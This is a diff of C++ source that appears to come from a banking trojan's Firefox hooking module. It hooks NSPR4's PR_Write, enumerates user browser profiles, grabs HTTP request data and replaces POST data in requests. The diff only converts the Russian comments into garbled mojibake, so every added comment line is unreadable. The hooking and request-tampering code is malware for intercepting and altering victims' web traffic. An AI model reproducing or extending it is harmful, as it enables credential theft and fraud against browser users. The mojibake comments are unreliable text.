@@ -22,7 +22,7 @@
 #if(BO_NSPR4 > 0)
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Nekotrye like structures from NSPR4.
+//Р’В Nekotrye like structures from NSPR4.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 //PRFileDesc.
@@ -89,7 +89,7 @@ typedef __int32 (__cdecl *PR_GETERROR)(void);
 static PR_GETERROR prGetError;
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Connection table.
+//Р’В Connection table.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
@@ -125,11 +125,11 @@ static DWORD connectionsCount;
 static CRITICAL_SECTION connectionsCs;
 
 /*
-  Поиск соединенения в таблице.
+  РџРѕРёСЃРє СЃРѕРµРґРёРЅРµРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ.
 
-  IN fd  - хэндл.
+  IN fd  - С…СЌРЅРґР».
 
-  Return - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, РёР»Рё (DWORD)-1 РµСЃР»Рё РЅРµ РЅР°Р№РґРµРЅРѕ.
 */
 static DWORD connectionFind(const PRFILEDESC *fd)
 {
@@ -138,11 +138,11 @@ static DWORD connectionFind(const PRFILEDESC *fd)
 }
 
 /*
-  Добавление соединения в таблицу.
+  Р”РѕР±Р°РІР»РµРЅРёРµ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Сѓ.
 
-  IN fd  - хэндл.
+  IN fd  - С…СЌРЅРґР».
 
-  Return - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, РёР»Рё (DWORD)-1 РµСЃР»Рё РЅРµ РЅР°Р№РґРµРЅРѕ.
 */
 static DWORD connectionAdd(const PRFILEDESC *fd)
 {
@@ -183,9 +183,9 @@ static DWORD connectionAdd(const PRFILEDESC *fd)
 }
 
 /*
-  Удаление соединения из таблицы.
+  РЈРґР°Р»РµРЅРёРµ СЃРѕРµРґРёРЅРµРЅРёСЏ РёР· С‚Р°Р±Р»РёС†С‹.
 
-  IN index - индекс соединения.
+  IN index - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ.
 */
 static void connectionRemove(DWORD index)
 {
@@ -217,21 +217,21 @@ static void connectionRemove(DWORD index)
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 /*
-  Кэлбэк enumProfiles().
+  РљСЌР»Р±СЌРє enumProfiles().
 
-  IN path  - полный путь профиля.
-  IN param - произволный параметр.
+  IN path  - РїРѕР»РЅС‹Р№ РїСѓС‚СЊ РїСЂРѕС„РёР»СЏ.
+  IN param - РїСЂРѕРёР·РІРѕР»РЅС‹Р№ РїР°СЂР°РјРµС‚СЂ.
 
-  Return   - true - для продолжения поиска,
-             false - для прерывания поиска.
+  Return   - true - РґР»СЏ РїСЂРѕРґРѕР»Р¶РµРЅРёСЏ РїРѕРёСЃРєР°,
+             false - РґР»СЏ РїСЂРµСЂС‹РІР°РЅРёСЏ РїРѕРёСЃРєР°.
 */
 typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);
 
 /*
-  Перечелсение всех профилей текущего юзера.
+  РџРµСЂРµС‡РµР»СЃРµРЅРёРµ РІСЃРµС… РїСЂРѕС„РёР»РµР№ С‚РµРєСѓС‰РµРіРѕ СЋР·РµСЂР°.
 
-  IN proc  - кэллбэк.
-  IN param - произволный параметр для кээлбэка.
+  IN proc  - РєСЌР»Р»Р±СЌРє.
+  IN param - РїСЂРѕРёР·РІРѕР»РЅС‹Р№ РїР°СЂР°РјРµС‚СЂ РґР»СЏ РєСЌСЌР»Р±СЌРєР°.
 */
 static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 {
@@ -391,15 +391,15 @@ void Nspr4Hook::updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Заполнение HttpGrabber::REQUESTDATA.
+  Р—Р°РїРѕР»РЅРµРЅРёРµ HttpGrabber::REQUESTDATA.
 
-  OUT requestData - структура. Если (requestData->handle == NULL) запрос нужно проигнорировать.
-  IN fd           - хэндл запроса.
-  IN data         - данные.
-  IN dataSize     - размер данных.
+  OUT requestData - СЃС‚СЂСѓРєС‚СѓСЂР°. Р•СЃР»Рё (requestData->handle == NULL) Р·Р°РїСЂРѕСЃ РЅСѓР¶РЅРѕ РїСЂРѕРёРіРЅРѕСЂРёСЂРѕРІР°С‚СЊ.
+  IN fd           - С…СЌРЅРґР» Р·Р°РїСЂРѕСЃР°.
+  IN data         - РґР°РЅРЅС‹Рµ.
+  IN dataSize     - СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С….
 
-  Return          -  кол. байт, через котороу нужно начать обрабатывать следущий запрос,
-                    (DWORD)-1 - в случаи ошибки, дальнейший парсинг соединения делать нельзя.
+  Return          -  РєРѕР». Р±Р°Р№С‚, С‡РµСЂРµР· РєРѕС‚РѕСЂРѕСѓ РЅСѓР¶РЅРѕ РЅР°С‡Р°С‚СЊ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊ СЃР»РµРґСѓС‰РёР№ Р·Р°РїСЂРѕСЃ,
+                    (DWORD)-1 - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё, РґР°Р»СЊРЅРµР№С€РёР№ РїР°СЂСЃРёРЅРі СЃРѕРµРґРёРЅРµРЅРёСЏ РґРµР»Р°С‚СЊ РЅРµР»СЊР·СЏ.
 */
 static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILEDESC *fd, const void *data, DWORD dataSize)
 {
@@ -472,7 +472,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
         schemeSize = 8;
       }
 
-      requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*слеш*/ + uriSize);
+      requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*СЃР»РµС€*/ + uriSize);
       if(requestData->url == NULL)return bytesToSkip;
       
       //Scheme
@@ -539,16 +539,16 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 }
 
 /*
-  Подмена POST-данных в запросе.
+  РџРѕРґРјРµРЅР° POST-РґР°РЅРЅС‹С… РІ Р·Р°РїСЂРѕСЃРµ.
 
-  IN originalRequest     - оригинальный HTTP-запрос.
-  IN originalRequestSize - размер originalRequest.
-  IN newPostData         - новые POST-данные.
-  IN newPostDataSize     - размер newPostData.
-  OUT newRequest         - новый HTTP-запрос. Нужно освободить через Mem.
+  IN originalRequest     - РѕСЂРёРіРёРЅР°Р»СЊРЅС‹Р№ HTTP-Р·Р°РїСЂРѕСЃ.
+  IN originalRequestSize - СЂР°Р·РјРµСЂ originalRequest.
+  IN newPostData         - РЅРѕРІС‹Рµ POST-РґР°РЅРЅС‹Рµ.
+  IN newPostDataSize     - СЂР°Р·РјРµСЂ newPostData.
+  OUT newRequest         - РЅРѕРІС‹Р№ HTTP-Р·Р°РїСЂРѕСЃ. РќСѓР¶РЅРѕ РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· Mem.
   
-  Return                 - размер нового HTTP-запроса,
-                           0 - в случаи ошибки.
+  Return                 - СЂР°Р·РјРµСЂ РЅРѕРІРѕРіРѕ HTTP-Р·Р°РїСЂРѕСЃР°,
+                           0 - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static DWORD replacePostData(const void *originalRequest, DWORD originalRequestSize, const void *newPostData, DWORD newPostDataSize, void **newRequest)
 {
@@ -602,7 +602,7 @@ static DWORD replacePostData(const void *originalRequest, DWORD originalRequestS
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Analysis of HTTP.
+//Р’В Analysis of HTTP.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 //Flags HTTPREQUESTINFO.flags.
@@ -623,16 +623,16 @@ typedef struct
 }HTTPREQUESTINFO;
 
 /*
-  Анализ HTTP-заголовка.
+  РђРЅР°Р»РёР· HTTP-Р·Р°РіРѕР»РѕРІРєР°.
 
-  OUT info       - данные.
-  IN request     - запрос.
-  IN requestSize - размер request.
+  OUT info       - РґР°РЅРЅС‹Рµ.
+  IN request     - Р·Р°РїСЂРѕСЃ.
+  IN requestSize - СЂР°Р·РјРµСЂ request.
   
   
-  Return         -  1 - заголовок прочитан,
-                    0 - заголовок еще не прочитан.
-                   -1 - ошибка/ответ не интересен
+  Return         -  1 - Р·Р°РіРѕР»РѕРІРѕРє РїСЂРѕС‡РёС‚Р°РЅ,
+                    0 - Р·Р°РіРѕР»РѕРІРѕРє РµС‰Рµ РЅРµ РїСЂРѕС‡РёС‚Р°РЅ.
+                   -1 - РѕС€РёР±РєР°/РѕС‚РІРµС‚ РЅРµ РёРЅС‚РµСЂРµСЃРµРЅ
 */
 static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD requestSize)
 {
@@ -726,18 +726,18 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 }
 
 /*
-  Анналлиз контента.
+  РђРЅРЅР°Р»Р»РёР· РєРѕРЅС‚РµРЅС‚Р°.
   
-  IN OUT info     - данные.
-  IN request      - запрос.
-  IN requestSize  - размер request.
-  IN isClose      - true - получено событие Close от сервера.
-  OUT content     - контент. Выделяется только при возращении 1.
-  OUT contentSize - размер content.
+  IN OUT info     - РґР°РЅРЅС‹Рµ.
+  IN request      - Р·Р°РїСЂРѕСЃ.
+  IN requestSize  - СЂР°Р·РјРµСЂ request.
+  IN isClose      - true - РїРѕР»СѓС‡РµРЅРѕ СЃРѕР±С‹С‚РёРµ Close РѕС‚ СЃРµСЂРІРµСЂР°.
+  OUT content     - РєРѕРЅС‚РµРЅС‚. Р’С‹РґРµР»СЏРµС‚СЃСЏ С‚РѕР»СЊРєРѕ РїСЂРё РІРѕР·СЂР°С‰РµРЅРёРё 1.
+  OUT contentSize - СЂР°Р·РјРµСЂ content.
 
-  Return          -  1 - контент прочитан,
-                     0 - контент еще не прочитан.
-                    -1 - ошибка/ответ не интересен
+  Return          -  1 - РєРѕРЅС‚РµРЅС‚ РїСЂРѕС‡РёС‚Р°РЅ,
+                     0 - РєРѕРЅС‚РµРЅС‚ РµС‰Рµ РЅРµ РїСЂРѕС‡РёС‚Р°РЅ.
+                    -1 - РѕС€РёР±РєР°/РѕС‚РІРµС‚ РЅРµ РёРЅС‚РµСЂРµСЃРµРЅ
 */
 static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, DWORD bufferSize, bool isClose, void **content, LPDWORD contentSize)
 {
@@ -1076,7 +1076,7 @@ __int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amou
   if(Core::isActive() && buf != NULL && amount > 0)
   {
     /*
-      Я просто охуел писать этот алгоритм.
+      РЇ РїСЂРѕСЃС‚Рѕ РѕС…СѓРµР» РїРёСЃР°С‚СЊ СЌС‚РѕС‚ Р°Р»РіРѕСЂРёС‚Рј.
     */
     CWA(kernel32, EnterCriticalSection)(&connectionsCs);
     DWORD connectionIndex = connectionFind((PRFILEDESC *)fd);
